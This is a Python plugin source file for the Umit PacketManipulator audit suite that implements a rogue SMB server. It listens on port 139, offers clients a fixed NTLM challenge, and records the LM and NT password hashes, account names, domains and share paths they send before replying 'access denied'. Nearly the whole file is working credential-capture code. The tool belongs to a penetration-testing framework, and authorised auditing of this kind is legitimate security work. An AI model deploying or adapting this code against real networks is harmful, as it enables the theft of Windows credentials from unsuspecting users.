#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2010 Adriano Monteiro Marques
#
# Author: Francesco Piccinno <stack.box@gmail.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

import gtk
import time
import gobject

from threading import Thread
from SocketServer import BaseRequestHandler, TCPServer

from umit.pm.core.i18n import _
from umit.pm.core.logger import log
from umit.pm.core.const import STATUS_WARNING, STATUS_INFO

from umit.pm.backend import MetaPacket
from umit.pm.manager.auditmanager import *

AUDIT_NAME = 'smb-sniffer'
AUDIT_MSG = '<tt><b>' + AUDIT_NAME + ':</b> %s</tt>'

SMB_COM_TREE_CONNECT       = 0x70
SMB_CMD_NEGOTIATE          = 0x72
SMB_CMD_SESSION_SETUP_ANDX = 0x73

class SMBHandler(BaseRequestHandler):
    def setup(self):
        self.smbsrc = ''
        self.challenge = 0x1122334455667788

    def handle(self):
        raw = self.request.recv(1024)
        pkt = MetaPacket.new_from_str('nbt', raw)

        if not pkt:
            return

        if pkt.get_field('nbt.TYPE') == 0x81:
            self.smbsrc = pkt.get_field('nbt.CALLINGNAME','') or self.smbsrc
            self.smbsrc = self.smbsrc.replace("\x00", "").strip(" ")
            self.request.send("\x82\x00\x00\x00")
            self.handle()
            return

        if pkt.get_field('smb.Flags', 0) & 128 != 0:
            self.handle()
            return

        cmd = pkt.get_field('smb.Command')

        if cmd == SMB_CMD_NEGOTIATE:
            reply = MetaPacket.new('nbt') / \
                    MetaPacket.new('smb') / \
                    MetaPacket.new('smbneg_resp')

            reply.set_fields('smb', {
                'PID' : pkt.get_field('smb.PID'),
                'Command' : SMB_CMD_NEGOTIATE,
                'Flags' : 0x88,
                'Flags2' : 0xc001,
                'WordCount' : 17})

            t64 = (int(time.time()) * 11644473600) * 10000000
            time_hi, time_lo = (t64 & 0xffffffff00000000) >> 32, \
                               (t64 & 0x00000000ffffffff)

            reply.set_fields('smbneg_resp', {
                'DialectIndex' : 5,
                'SecurityMode' : 3,
                'MacMpxCount' : 2,
                'MaxNumberVC' : 1,
                'MaxBufferSize' : 4356,
                'MaxRawSize' : 65536,
                'SessionKey' : 0,
                'ServerCapabilities' : 58365,
                'UnixExtensions' : 0,
                'ExtendedSecurity' : 0,
                'ServerTimeZone' : 0, # TODO: fixme
                'ServerTimeHigh' : time_hi,
                'ServerTimeLow' : time_lo,
                'EncryptionKeyLength' : 8,
                'ByteCount' : 8 + 2 + ((len(self.smbsrc) + 1) * 2),
                'EncryptionKey' : self.challenge,
                'DomainName' : '',
                'ServerName' : self.smbsrc})

            self.request.send(reply.get_raw())

            self.handle()

        elif cmd == SMB_CMD_SESSION_SETUP_ANDX:
            # Capture infos
            convert = lambda x:"".join([hex(ord(c))[2:].zfill(2) for c in x])

            lm_hash  = convert(pkt.get_field('smbsax_req.ANSIPassword', ''))
            nt_hash  = convert(pkt.get_field('smbsax_req.UnicodePassword', ''))

            account  = pkt.get_field('smbsax_req.Account', '')
            pdomain  = pkt.get_field('smbsax_req.PrimaryDomain', '')
            nativeos = pkt.get_field('smbsax_req.NativeOS', '')
            nativelm = pkt.get_field('smbsax_req.NativeLanManager', '')
            path     = pkt.get_field('smbtcax_req.Path', '')

            if not lm_hash or lm_hash == "00" or lm_hash == "52d536dbcefa63b9101f9c7a9d0743882f85252cc731bb25":
                lm_hash = ''
            if not nt_hash or nt_hash == "00" or nt_hash == "eefabc742621a883aec4b24e0f7fbf05e17dc2880abe07cc":
                nt_hash = ''

            if account or (lm_hash or nt_hash):
                self.server.op.sess.output_page.user_msg(
                    _('Account: %s LMHASH: %s NTHASH: %s DOMAIN: %s PATH: %s ' \
                      'OS: %s LANMANAGER: %s') % \
                      (account, lm_hash, nt_hash, pdomain, path, \
                       nativeos, nativelm), STATUS_INFO, AUDIT_NAME)

            # Send STATUS_ACCESS_DENIED
            reply = MetaPacket.new('nbt') / \
                    MetaPacket.new('smb') / \
                    MetaPacket.new('smbsax_resp')

            self.setup_pkt(reply, pkt)

            reply.set_fields('smb', {
                'Command' : 0x73,
                'Flags' : 0x88,
                'Flags2' : 0xc001,
                'Error_Class' : 34,
                'Error_Code' : 49152})

            self.request.send(reply.get_raw())
            self.handle()

        elif cmd == SMB_COM_TREE_CONNECT:
            reply = MetaPacket.new('nbt') / \
                    MetaPacket.new('smb') / \
                    MetaPacket.new('smbsax_resp')

            self.setup_pkt(reply, pkt)

            reply.set_fields('smb', {
                'Command' : cmd,
                'Flags' : 0x88,
                'Flags2' : 0xc001,
                'Error_Class' : 0xc0000022})

            self.request.send(reply.get_raw())
        else:
            reply = MetaPacket.new('nbt') / \
                    MetaPacket.new('smb') / \
                    MetaPacket.new('smbsax_resp')

            self.setup_pkt(reply, pkt)

            reply.set_fields('smb', {
                'Command' : cmd,
                'Flags' : 0x88,
                'Flags2' : 0xc001,
                'Error_Class' : 0})

            self.request.send(reply.get_raw())

    def setup_pkt(self, reply, pkt):
        reply.set_fields('smb', {
            'PID' : pkt.get_field('smb.PID'),
            'UID' : pkt.get_field('smb.UID'),
            'TID' : pkt.get_field('smb.TID'),
            'MID' : pkt.get_field('smb.MID')})


class SMBServer(TCPServer):
    def __init__(self, op, *args, **kwargs):
        self.op = op
        TCPServer.__init__(self, *args, **kwargs)

class SMBSnifferOperation(AuditOperation):
    has_start = True
    has_stop = True

    def __init__(self, sess, host, port):
        AuditOperation.__init__(self)

        self.sess = sess
        self.thread = None
        self.percentage = (self.percentage + 536870911) % \
                           gobject.G_MAXINT

        try:
            self.serv = SMBServer(self, (host, port), SMBHandler)

            self.summary = AUDIT_MSG % _('Listening on %s:%d') % (host, port)
        except Exception, exc:
            self.serv = None
            self.summary = AUDIT_MSG % str(exc)

    def start(self):
        if self.serv:
            self.state = self.RUNNING
            self.thread = Thread(target=self.serv.serve_forever)
            self.thread.setDaemon(True)
            self.thread.start()
        else:
            self.state = self.NOT_RUNNING

    def stop(self):
        if self.serv and self.state == self.RUNNING:
            self.state = self.NOT_RUNNING
            self.serv.shutdown()
            self.summary = AUDIT_MSG % _('Stopped')

class SMBSniffer(ActiveAudit):
    __inputs__ = (
        ('host', ('0.0.0.0', _('Listen on given host'))),
        ('port', (139, _('The port on which listen on.'))),
    )

    def start(self, reader):
        a, self.item = self.add_menu_entry('SMBSniffer',
                                           _('Sniff SMB password ...'),
                                           _('Sniff LM hash from SMB resource'),
                                           gtk.STOCK_EXECUTE)

    def stop(self):
        self.remove_menu_entry(self.item)

    def execute_audit(self, sess, inp_dict):
        port = inp_dict['port']
        host = inp_dict['host'] or '0.0.0.0'

        if port < 1 or port > 65535:
            port = 139
            sess.output_page.user_msg(_('Falling back to 139 as listen port'),
                                      STATUS_WARNING, AUDIT_NAME)

        return SMBSnifferOperation(sess, host, port)

__plugins__ = [SMBSniffer]
__plugins_deps__ = []

__audit_type__ = 1
__protocols__ = (('tcp', 139), ('smb', None))

